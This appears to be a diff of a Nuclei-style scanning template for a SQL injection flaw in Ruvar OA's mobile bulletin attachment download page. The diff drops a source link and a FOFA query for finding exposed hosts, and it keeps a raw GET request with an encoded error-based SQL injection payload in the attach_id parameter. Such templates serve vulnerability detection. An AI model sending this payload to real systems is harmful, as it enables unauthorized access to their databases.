@@ -3,14 +3,8 @@ info:
   name: RuvarOAAttachDownLoad存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/10d98676e9636e2bf02eb593a2ce5fa2
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 10d98676e9636e2bf02eb593a2ce5fa2
-    fofa: + fofa`body="txt_admin_key"`
 http:
 - raw:
   - 'GET /Mobile/Bulletin/AttachDownLoad.aspx?attach_id=1%27%29+AND+2821+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%282821%3D2821%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29+AND+%28%27lJJA%27%3D%27lJJA HTTP/1.1
